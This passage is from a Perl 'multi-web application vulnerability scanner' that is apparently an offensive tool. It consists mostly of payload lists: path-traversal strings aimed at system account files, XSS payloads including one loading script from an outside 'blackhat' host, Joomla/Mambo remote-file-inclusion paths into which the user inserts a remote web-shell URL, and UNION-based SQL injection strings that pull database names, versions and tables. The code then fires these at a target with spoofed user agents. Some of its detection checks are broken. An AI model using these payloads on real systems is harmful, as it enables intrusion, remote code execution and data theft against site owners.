etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/group","../etc/security/group","../../etc/security/group","../../../etc/security/group","../../../../etc/security/group","../../../../../etc/security/group","../../../../../../etc/security/group","../../../../../../../etc/security/group","../../../../../../../../etc/security/group","../../../../../../../../../etc/security/group","../../../../../../../../../../etc/security/group","/etc/security/group%00","../etc/security/group%00","../../etc/security/group%00","../../../etc/security/group%00","../../../../etc/security/group%00","../../../../../etc/security/group%00","../../../../../../etc/security/group%00","../../../../../../../etc/security/group%00","../../../../../../../../etc/security/group%00","../../../../../../../../../etc/security/group%00","../../../../../../../../../../etc/security/group%00","%2Fetc%2Fsecurity%2Fgroup","..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","%2Fetc%2Fsecurity%2Fgroup%00","..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","%2F%2Fetc/security/group","....%2F%2Fetc/security/group","....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","%2F%2Fetc/security/group%00","....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","//etc/security/group","....//etc/security/group","....//....//etc/security/group","....//....//....//etc/security/group","....//....//....//....//etc/security/group","....//....//....//....//....//etc/security/group","....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//....//etc/security/group","//etc/security/group%00","....//etc/security/group%00","....//....//etc/security/group%00","....//....//....//etc/security/group%00","....//....//....//....//etc/security/group%00","....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//....//etc/security/group%00");
@XSS = ("G3n3Rall",
"<center>G3n3Rall</center>",
"<center><marquee>G3n3Rall</marquee> </center>",
"<CeNTer>G3n3Rall</CeNTer>",
"='><script>alert(document.cookie)</script>",
"&lt;script&gt;alert('G3n3Rall');&lt;/script&gt",
"a?<script>alert('G3n3Rall')</script>",
"<SCRIPT>a=/G3n3Rall/alert(a.source)</SCRIPT>",
"%3Cscript%3Ealert('G3n3Rall')%3C/script%3E",
"<SCRIPT>alert(String.fromCharCode(56,56,44,56,51,44,56,51))</SCRIPT>",
"<IMG SRC=javascript:alert(String.fromCharCode(56,56,44,56,51,44,56,51))>",
"<IMG SRC=javascript:alert('G3n3Rall')>",
"<SCRIPT>a=/G3n3Rall/alert(a.source)</SCRIPT>",
"<SCRIPT SRC=http://g3n3rall-blackhat.persiangig.com/XSS.JS?<B>");
@RFI = ("/components/com_flyspray/startdown.php?file=",
"/administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=",
"/components/com_simpleboard/file_upload.php?sbp=",
"/components/com_hashcash/server.php?mosConfig_absolute_path=",
"/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=",
"/components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path=",
"/components/com_performs/performs.php?mosConfig_absolute_path=",
"/components/com_forum/download.php?phpbb_root_path=",
"/components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=",
"/components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=",
"/components/minibb/index.php?absolute_path=",
"/components/com_smf/smf.php?mosConfig_absolute_path=",
"/modules/mod_calendar.php?absolute_path=",
"/components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path=",
"/components/com_loudmounth/includes/abbc/abbc.class.php?mosConfig_absolute_path=",
"/components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=",
"/components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=",
"/administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=",
"/administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?mosConfig_live_site=",
"/administrator/components/com_colophon/admin.colophon.php?mosConfig_absolute_path=",
"/administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=",
"/components/com_mambatstaff/mambatstaff.php?mosConfig_absolute_path=",
"/components/com_securityimages/configinsert.php?mosConfig_absolute_path=",
"/components/com_securityimages/lang.php?mosConfig_absolute_path=",
"/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=",
"/components/com_galleria/galleria.html.php?mosConfig_absolute_path=",
"/akocomments.php?mosConfig_absolute_path=",
"/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=",
"/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=",
"/administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=",
"/components/com_zoom/classes/fs_unix.php?mosConfig_absolute_path=",
"/components/com_zoom/includes/database.php?mosConfig_absolute_path=",
"/administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=",
"/components/com_fm/fm.install.php?lm_absolute_path=",
"/administrator/components/com_mambelfish/mambelfish.class.php?mosConfig_absolute_path=",
"/components/com_lmo/lmo.php?mosConfig_absolute_path=",
"/administrator/components/com_webring/admin.webring.docs.php?component_dir=",
"/administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=",
"/administrator/components/com_babackup/classes/Tar.php?mosConfig_absolute_path=",
"/administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=",
"/components/com_mambowiki/MamboLogin.php?IP=",
"/administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site=",
"/administrator/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=",
"/components/com_cpg/cpg.php?mosConfig_absolute_path=",
"/components/com_moodle/moodle.php?mosConfig_absolute_path=",
"/components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path=",
"/components/com_mospray/scripts/admin.php?basedir=",
"/administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path=",
"/administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path=",
"/administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=",
"/components/com_reporter/processor/reporter.sql.php?mosConfig_absolute_path=",
"/components/com_madeira/img.php?url=",
"/components/com_bsq_sitestats/external/rssfeed.php?baseDir=",
"/com_bsq_sitestats/external/rssfeed.php?baseDir=",
"/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=",
"/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=",
"/administrator/components/admin.jjgallery.php?mosConfig_absolute_path=",
"/components/com_jreviews/scripts/xajax.inc.php?mosConfig_absolute_path=",
"/com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_chronocontact/excelwriter/PPS/File.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/Writer.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/PPS.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php?mosConfig_absolute_path=",
"/administrator/components/com_chronocontact/excelwriter/Writer/Format.php?mosConfig_absolute_path=",
"/index.php?option=com_custompages&cpage=",
"/component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=",
"/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=",
"/components/com_facileforms/facileforms.frame.php?ff_compath=",
"/administrator/components/com_rssreader/admin.rssreader.php?mosConfig_live_site=",
"/administrator/components/com_feederator/includes/tmsp/add_tmsp.php?mosConfig_absolute_path=",
"/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?mosConfig_absolute_path=",
"/administrator/components/com_feederator/includes/tmsp/subscription.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_feederator/includes/tmsp/tmsp.php?mosConfig_absolute_path=",
"/administrator/components/com_clickheat/install.clickheat.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_clickheat/includes/heatmap/_main.php?mosConfig_absolute_path=",
"/administrator/components/com_clickheat/includes/heatmap/main.php?mosConfig_absolute_path=",
"/administrator/components/com_clickheat/includes/overview/main.php?mosConfig_absolute_path=",
"/administrator/components/com_clickheat/Recly/Clickheat/Cache.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_clickheat/Recly/common/GlobalVariables.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_competitions/includes/competitions/add.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_competitions/includes/competitions/competitions.php?GLOBALS[mosConfig_absolute_path]=",
"/administrator/components/com_competitions/includes/settings/settings.php?mosConfig_absolute_path=",
"/administrator/components/com_dadamail/config.dadamail.php?GLOBALS['mosConfig_absolute_path']=",
"/administrator/components/com_googlebase/admin.googlebase.php?mosConfig_absolute_path=",
"/administrator/components/com_ongumatimesheet20/lib/onguma.class.php?mosConfig_absolute_path=",
"/administrator/components/com_treeg/admin.treeg.php?mosConfig_live_site=",
"/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=",
"/components/com_jd-wiki/lib/tpl/default/main.php?mosConfig_absolute_path=",
"/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=",
"/components/com_mtree/Savant2/Savant2_Plugin_textarea.php?mosConfig_absolute_path=",
"/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=",
"/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path=",
"/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=",
"/components/com_reporter/reporter.logic.php?mosConfig_absolute_path=",
"/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=",
"/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=",
"/components/com_joomlaboard/file_upload.php?sbp=",
"/components/com_thopper/inc/contact_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/itemstatus_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/projectstatus_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/request_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/responses_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/timelog_type.php?mosConfig_absolute_path=",
"/components/com_thopper/inc/urgency_type.php?mosConfig_absolute_path=",
"/components/com_mosmedia/media.tab.php?mosConfig_absolute_path=",
"/components/com_mosmedia/media.divs.php?mosConfig_absolute_path=",
"/modules/mod_as_category/mod_as_category.php?mosConfig_absolute_path=",
"/modules/mod_as_category.php?mosConfig_absolute_path=",
"/components/com_articles.php?absolute_path=",
"/classes/html/com_articles.php?absolute_path=",
"/administrator/components/com_jpack/includes/CAltInstaller.php?mosConfig_absolute_path=",
"/templates/be2004-2/index.php?mosConfig_absolute_path=",
"/libraries/pcl/pcltar.php?g_pcltar_lib_dir=",
"/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site=",
"/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=",
"/administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=",
"/components/com_slideshow/admin.slideshow1.php?mosConfig_live_site=",
"/administrator/components/com_panoramic/admin.panoramic.php?mosConfig_live_site=",
"/administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=",
"/administrator/components/com_wmtportfolio/admin.wmtportfolio.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/credits.html.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/info.html.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/media.divs.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/media.divs.js.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/purchase.html.php?mosConfig_absolute_path=",
"/administrator/components/com_mosmedia/includes/support.html.php?mosConfig_absolute_path=",
"/components/com_mp3_allopass/allopass.php?mosConfig_live_site=",
"/components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=",
"/administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=",
"/administrator/components/com_jcs/views/reports.html.php?mosConfig_absolute_path=",
"/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=",
"/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=",
"/administrator/components/com_color/admin.color.php?mosConfig_live_site=",
"/administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=",
"/administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=",
"/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=",
"/index.php?option=com_adsmanager&mosConfig_absolute_path=",
"/com_ponygallery/admin.ponygallery.html.php?mosConfig_absolute_path=",
"/com_magazine_3_0_1/magazine.functions.php?config=",
"/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=",
"/administrator/components/com_universal/includes/config/config.html.php?mosConfig_absolute_path=",
"/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=");
@SQL = (
"'",
" order by 1",
" order by 2",
" order by 4",
" union select 1,2,3",
" union select 1,database(),3",
" union select 1,version(),current_user()",
" union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1",
" union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1",
);
@SQLInt = (
" --+",
" order by 1 --+",
" order by 2 --+",
" order by 4 --+",
" union select 1,2,3 --+",
" union select 1,database(),3 --+",
" union select 1,version(),current_user() --+",
" union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1 --+",
" union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1 --+",
);
@SQLUnion = (
'"',
' order by 1"',
' order by 2"',
' order by 4"',
' union select 1,2,3"',
' union select 1,database(),3"',
' union select 1,version(),current_user()"',
' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1"',
' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1"',
' "',
' order by 1 "',
' order by 2 "',
' order by 4 "',
' union select 1,2,3 "',
' union select 1,database(),3 "',
' union select 1,version(),current_user() "',
' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1 "',
' union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1 "',
);

######

### SETS ALL VARIABLES ###
$version = "1.0";
######

### SETS ALL ARGUMENTS ###
GetOptions(
	"help+"                  => \my $help,
	"version+"               => \my $vers,
	"vuln-info+"             => \my $vulnInfo,
    "u|url=s"                => \my $target,
	"user-agent=s"           => \my $userAg,
	"xss+"                   => \my $xss,
	"lfi+"                   => \my $lfi,
	"rfi+"                   => \my $rfi,
	"sql+"                   => \my $sql,

) or die "[-] Error while setting up command-line arguments";
######

### HELP MENU ###
sub HelpMenu()
{
	print BOLD YELLOW, "<++ Hepheastus's Help Menu ++>\n\n", RESET;
	print "* Scan Configuration *\n";
	print "   --url=|-url=     : Sets the URL / Target to scan.\n";
	print "   --xss|-xss       : Enables XSS, CSS, Cross-Site Scripting vulnerability scanner.\n";
	print "   --lfi|-lfi       : Enables LFI, Local File Inclusion vulnerability scanner.\n";
	print "   --rfi|-rfi       : Enables RFI, Remote File Inclusion vulnerability scanner.\n";
	print "   --sql|-sql       : Enables SQL, Structured Query Language Injection vulnerability scanner.\n";
	print "                sql>: SQL Injections Scanner includes, Integer-Based, Union-Based and Error-Based.\n";
	print "\n";
	print "* Anonymising Options *\n";
    print "   --user-agent=    : Enable User-Agent Spoofing. (TIP: If you put auto as the user-agent, we will set a random useragent!)\n";
    print "\n";
    print "* Misc Options *\n";
    print "   --help|-help     : Display this help menu.\n";
    print "   --vuln-info      : Display more informations about scannable vulnerability.\n";
    print "   --version        : Display the current version.\n";
	exit(0);
}
######

### VULN INFO ###
sub vulnInfo(){
   print BOLD YELLOW, "<++ Vulnerability Informations ++>\n\n", RESET;
   print "* XSS / CSS / Cross-Site Scripting *\n";
   print "XSS is a client-side / server-side vulnerability, which allows anyone to execute custom JavaScript on the remot server.\n\n";
   print "* LFI / Local File Inclusion *\n";
   print "LFI is a web-server side vulnerability, which allows anyone to see the remote system files as configuration files.\n\n";   
   print "* RFI / Remote File Inclusion *\n";
   print "RFI is a web-server side vulnerability, which allows anyone to force the server to download a file and execute it.\n\n";
   print "* SQL / Structured Query Language Injection *\n";
   print "SQL Injection is a web-server side vulnerability, probably one of the most used and exploited vulnerability it allows anyone that exploits it to execute remote SQL command right into the MySQL, Oracle etc database.\n\n";
   exit(0);
}
######

if($userAg eq "auto")
{
    $TempUserAg = `shuf -n 1 useragents.txt`; 
    $USERAGENT = $TempUserAg;
}
elsif(defined $userAg)
{
	$USERAGENT = $userAg;
}
system("clear");

print q{
 +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+
    __ __    ___  ____  __ __   ____    ___  _____ ______  __ __  _____
   |  |  |  /  _]|    \|  |  | /    |  /  _]/ ___/|      ||  |  |/ ___/
   |  |  | /  [_ |  o  )  |  ||  o  | /  [_(   \_ |      ||  |  (   \_ 
   |  _  ||    _]|   _/|  _  ||     ||    _]\__  ||_|  |_||  |  |\__  |
   |  |  ||   [_ |  |  |  |  ||  _  ||   [_ /  \ |  |  |  |  :  |/  \ |
   |  |  ||     ||  |  |  |  ||  |  ||     |\    |  |  |  |     |\    |
   |__|__||_____||__|  |__|__||__|__||_____| \___|  |__|   \__,_| \___|
   Github: https://github.com/DeaDHackS/Hepheastus                  V.1                                                       
 +~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+
};
print BOLD GREEN, "               MULTI-WEB APPLICATION VULNERABILITY SCANNER\n", RESET;
print "                    --<+>   Coded By"; print BOLD GREEN, " Ghosty", RESET; print "   <+>--";
print "\n\n";

if($vers eq '1'){
	print BOLD GREEN, "[+] ", RESET; print "Version --+> $version\n\n";
	exit(0);
}

if($vulnInfo eq '1'){
     vulnInfo();
}

if($help eq '1'){
	HelpMenu();
}

if(defined $target){
    if($target =~ /https:/ || $target =~ /http:/){
		print BOLD YELLOW, "[i] ", RESET; print "Target: ",$target,"\n\n";
	}
	else
	{
		print BOLD RED, "[-] ", RESET; print "ERROR: The given url is not detected as HTTPS or HTTP, please try again.\n\n";
		exit(0);
	}
}

print "::> Scan Configuiration <::\n";
if($xss eq '1'){
	print BOLD GREEN, "[YES]", RESET; print ": XSS - Cross-Site Scripting\n";
	$XSS = "true";
} else {
	print BOLD RED, "[NO]", RESET; print ": XSS - Cross-Site Scripting\n";
}
if($lfi eq '1'){
	print BOLD GREEN, "[YES]", RESET; print ": LFI - Local File Inclusion\n";
    $LFI = "true";
} else {
	print BOLD RED, "[NO]", RESET; print ": LFI - Local File Inclusion\n";
}
if($rfi eq '1'){
	print BOLD GREEN, "[YES]", RESET; print ": RFI - Remote File Inclusion\n";
	$RFI = "true";
} else {
	print BOLD RED, "[NO]", RESET; print ": RFI - Remote File Inclusion\n";
}
if($sql eq '1'){
	print BOLD GREEN, "[YES]", RESET; print ": SQL Injection - Structured Query Language Injection\n";
	$SQL = "true";
} else {
	print BOLD RED, "[NO]", RESET; print ": SQL Injection - Structured Query Language Injection\n";
}
if($userAg eq "auto")
{
    print BOLD YELLOW , "[SPOOF USER-AGENT]", RESET; print ">"; print BOLD GREEN, "[YES]", RESET; print ": Mode: Auto, User-agent --+> $USERAGENT\n";	
}
elsif(not defined $userAg)
{
    print BOLD YELLOW , "[SPOOF USER-AGENT]", RESET; print ">"; print BOLD RED, "[NO]", RESET; print ": User-agent will not be spoofed!\n";		
}
else
{
    print BOLD YELLOW , "[SPOOF USER-AGENT]", RESET; print ">"; print BOLD GREEN, "[YES]", RESET; print ": Mode: Manual, User-agent --+> $userAg\n";		
}

print "\n\n";
print BOLD BLUE, "[*] ", RESET; print "Launching Scan Against $target, please stand by!\n\n";

if($XSS eq "true")
{
	print "+--- XSS ---+\n";
	print BOLD YELLOW, "[i] ", RESET; print "Warning: XSS Scanner is not totally accurate, please consider to suggest anyway of making it more accurate thanks!\n\n";
	foreach $CSS(@XSS){
    $URL = $target.$CSS;
    $Source = get $URL;
    die "Can not get $URL" unless defined $URL;
    if ($URL =~ /G3n3Rall/ || /HAcked/ || /BHG/ || /XSS/ || /cookie/){ 
	   print BOLD GREEN, "[+] ", RESET; print "XSS Vulnerability Found At --+> $URL\n";
	   $XssFound = "true";
	}
}
    if($XssFound ne "true"){
		print BOLD RED "[-] ", RESET; print "No XSS Vulnerabilities Were Found!\n";
	}
    print BOLD BLUE, "\n[*] ", RESET; print "Finished XSS Scan!\n\n";
}


if($LFI eq "true")
{
    print "+--- LFI ---+\n";
	foreach $lFi(@LFI){
	$URL = $target.$lFi;
	$Source = get $URL;
	die "Can not get $URL" unless defined $URL;
	if ($Source =~ m/root/i || m/usr/i || m/dev/i || m/:x:/i || m/var/i || m/bin/i){ 
	   print BOLD GREEN, "[+] ", RESET; print "LFI Vulnerability Found At --+> $URL\n";
	   $LfiFound = "true";	
	}
}
    if($LfiFound ne "true"){
		print BOLD RED "[-] ", RESET; print "No LFI Vulnerabilities Were Found!\n";
	}
	print BOLD BLUE, "\n[*] ", RESET; print "Finished LFI Scan!\n\n";
}

if($RFI eq "true")
{
	print "+--- RFI ---+\n";
	print BOLD YELLOW, "[i] ", RESET; print "Tip: The url can be: https//my.shells/shells/shell.txt\n";
	print BOLD BLUE, "[?] ", RESET; print "Enter Shell URL ::+> "; 
	$Shell =<STDIN>;
	chomp ($Shell);
	sleep(2);
	print"\n";
 
	foreach $rFi(@RFI){
	my $URL = $target.$rFi.$Shell;
	my $Source = get $URL;
	die "Can not get $URL" unless defined $URL;
	if ($Source =~ /r57shell/ || /safe_mode/ || /Executed / || /Shell/){ 
        print BOLD GREEN, "[+] ", RESET; print "RFI Vulnerability Found At --+> $URL\n";
        $RfiFound = "true;"
	}
}
    if($RfiFound ne "true"){
		print BOLD RED "[-] ", RESET; print "No RFI Vulnerabilities Were Found!\n";
	}
    print BOLD BLUE, "\n[*] ", RESET; print "Finished RFI Scan!\n\n";
}

if($SQL eq "true")
{
    print "+--- SQL INJECTION ---+\n";
    print "* Error-Based *\n";
	foreach $sQl(@SQL){
	$URL = $target.$sQl;
	$ua = new LWP::UserAgent;
	$ua->agent($USERAGENT);
	$request = HTTP::Request->new('GET');
	$request->url($URL);
	$response = $ua->request($request);
	$code = $response->code;
	$headers = $response->headers_as_string;
	$body =  $response->content;
	$Source = $body;
	if ($Source =~ m/mysql_fetch_array()/i || $Source =~ m/mysql_error/i || $Source =~ m/SQL syntax/i || $Source =~ m/at line/i){ 
	   print BOLD GREEN, "[+] ", RESET; print "SQL Error-Based Injection Vulnerability Found At --+> $URL\n";
	   $SqlErrorFound = "true";	
	}
    }
    if($SqlErrorFound ne "true"){
		print BOLD RED "[-] ", RESET; print "No SQL Error-Based Injection Vulnerabilities Were Found!\n";
	}
		
    print "\n* Integer-Based *\n";
	foreach $sQl(@SQLInt){
	$URL = $target.$sQl;
	$ua = new LWP::UserAgent;
	$ua->agent($USERAGENT);
	$request = HTTP::Request->new('GET');
	$request->url($URL);
	$response = $ua->request($request);
	$code = $response->code;
	$headers = $response->headers_as_string;
	$body =  $response->content;
	$Source = $body;
	if ($Source =~ m/mysql_fetch_array()/i || $Source =~ m/mysql_error/i || $Source =~ m/SQL syntax/i || $Source =~ m/at line/i){ 
	   print BOLD GREEN, "[+] ", RESET; print "SQL Integer-Based Injection Vulnerability Found At --+> $URL\n";
	   $SqlIntFound = "true";	
	}
    }
    if($SqlIntFound ne "true"){
		print BOLD RED "[-] ", RESET; print "No SQL Integer-Based Injection Vulnerabilities Were Found!\n";
	}
	
	print "\n* Union-Based *\n";
	foreach $sQl(@SQLUnion){
	$URL = $target.$sQl;
	$ua = new LWP::UserAgent;
	$ua->agent($USERAGENT);
	$request = HTTP::Request->new('GET');
	$request->url($URL);
	$response = $ua->request($request);
	$code = $response->code;
	$headers = $response->headers_as_string;
	$body =  $response->content;
	$Source = $body;
	if ($Source =~ m/mysql_fetch_array()/i || $Source =~ m/mysql_error/i || $Source =~ m/SQL syntax/i || $Source =~ m/at line/i){ 
	   print BOLD GREEN, "[+] ", RESET; print "SQL Union-Based Injection Vulnerability Found At --+> $URL\n";
	   $SqlUnionFound = "true";	
	}
    }
    if($SqlUnionFound ne "true"){
		print BOLD RED "[-] ", RESET; print "No SQL Union-Based Injection Vulnerabilities Were Found!\n";
	}
	
	print BOLD BLUE, "\n[*] ", RESET; print "Finished SQL Injection Scan!\n\n";
}

exit(0);
